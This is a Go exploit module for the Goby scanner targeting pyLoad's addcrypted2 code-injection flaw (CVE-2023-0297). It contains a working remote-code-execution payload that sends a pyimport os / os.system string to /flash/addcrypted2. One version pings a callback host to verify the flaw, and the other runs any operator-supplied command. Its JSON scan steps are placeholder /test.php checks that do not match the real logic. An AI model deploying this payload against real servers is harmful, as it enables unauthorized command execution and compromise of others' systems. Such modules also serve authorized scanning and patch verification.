package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "pyload addcrypted2 RCE (CVE-2023-0297)",
    "Description": "<p>pyload is a free open source download manager written in Python, designed to be extremely lightweight, easily extensible and fully manageable over the web.</p><p>There is a code injection vulnerability in pyload/pyload 0.5.0b3.dev31 and earlier versions, which is due to the fact that attackers can implement code injection.</p>",
    "Product": "pyLoad-Interfaccia-web",
    "Homepage": "https://pyload.net/",
    "DisclosureDate": "2023-01-29",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"/json/set_captcha\"",
    "GobyQuery": "body=\"/json/set_captcha\"",
    "Level": "3",
    "Impact": "<p>There is a code injection vulnerability in pyload/pyload 0.5.0b3.dev31 and earlier versions, which is due to the fact that attackers can implement code injection.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d\">https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ping yourip",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-0297"
    ],
    "CNNVD": [
        "CNNVD-202301-1121"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "pyload addcrypted2 代码执行漏洞（CVE-2023-0297）",
            "Product": "pyLoad-Interfaccia-web",
            "Description": "<p>pyload是一个用 Python 编写的免费开源下载管理器，设计为极其轻量级、易于扩展且可通过 Web 完全管理。<br></p><p>pyload/pyload 0.5.0b3.dev31及以前版本存在代码注入漏洞，该漏洞源于攻击者可以实现代码注入。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d\">https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d</a><br></p>",
            "Impact": "<p>pyload/pyload 0.5.0b3.dev31及以前版本存在代码注入漏洞，该漏洞源于攻击者可以实现代码注入。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "pyload addcrypted2 RCE (CVE-2023-0297)",
            "Product": "pyLoad-Interfaccia-web",
            "Description": "<p>pyload is a free open source download manager written in Python, designed to be extremely lightweight, easily extensible and fully manageable over the web.<br></p><p>There is a code injection vulnerability in pyload/pyload 0.5.0b3.dev31 and earlier versions, which is due to the fact that attackers can implement code injection.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d\">https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d</a><br></p>",
            "Impact": "<p>There is a code injection vulnerability in pyload/pyload 0.5.0b3.dev31 and earlier versions, which is due to the fact that attackers can implement code injection.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10708"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			uri := "/flash/addcrypted2"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("jk=pyimport%%20os;os.system(\"ping%%20-c%%201%%20%s\");f=function%%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa",checkUrl)
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return godclient.PullExists(checkStr, time.Second*10)

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/flash/addcrypted2"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("jk=pyimport%%20os;os.system(\"%s\");f=function%%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa",cmd)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = "命令已执行"
				expResult.Success = true

			}
			return expResult
		},
	))
}